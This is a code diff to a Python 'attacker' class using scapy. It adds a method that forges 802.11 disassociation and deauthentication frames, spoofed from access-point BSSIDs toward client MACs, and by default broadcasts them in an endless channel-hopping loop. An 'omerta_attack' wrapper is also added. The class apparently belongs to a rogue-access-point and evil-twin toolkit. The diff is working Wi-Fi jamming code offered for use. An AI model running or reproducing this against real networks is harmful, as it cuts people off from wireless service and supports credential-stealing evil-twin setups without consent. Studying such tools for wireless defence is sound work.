@@ -15,7 +15,7 @@ import sys
 
 import scapy
 from scapy import *
-from scapy.layers.dot11 import RadioTap, Dot11, conf, Dot11Deauth, Dot11Elt, Dot11ProbeResp
+from scapy.layers.dot11 import RadioTap, Dot11, conf, Dot11Deauth, Dot11Elt, Dot11ProbeResp, Dot11Disas
 from scapy.sendrecv import sendp
 
 from Sniffer_dir import FakeAP
@@ -97,6 +97,31 @@ class attacker:
                                          / Dot11Elt(ID="DSset", info="\x06") \
                                          / Dot11Elt(ID="TIM",   info="\xFF\xFF\xFF\xFF")
                 sendp(null_probe_resp_frame, iface=self.attack_int, count=10, verbose=0)
+
+    def dissasoc(self, args: list[dict], frames_quantity=-1, reason=7):
+        if frames_quantity == -1:
+            self.attack_int = self.__start_monitor_mode(self.attack_int)
+            while True:
+                for i in range(len(args)):
+                    # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                    #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                    self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                    dissasoc_frame = RadioTap() / Dot11(type=0, subtype=0xa, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
+                                                      addr3=args[i]["BSSID"]) / Dot11Disas(reason=reason)
+                    quantity = 10
+                    sendp(dissasoc_frame, iface=self.attack_int, count=quantity, verbose=0)
+        else:
+            for i in range(len(args)):
+                # if args[i]["Freq"] == '2.4':  # 2.4 GHz
+                #     self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                self.__change_channel(self.attack_int, int(args[i]["Channel"]))
+                dissasoc_frame = RadioTap() / Dot11(type=0, subtype=0xa, addr1=args[i]["MAC"], addr2=args[i]["BSSID"],
+                                                  addr3=args[i]["BSSID"]) / Dot11Deauth(reason=reason)
+                sendp(dissasoc_frame, iface=self.attack_int, count=frames_quantity, verbose=0)
+
+    def omerta_attack(self, args: list[dict]):
+        self.dissasoc(args, reason=0x01)
+
 
     def rogue_twin(self, args: dict):
         if args["Freq"] == '2.4':  # 2.4 GHz
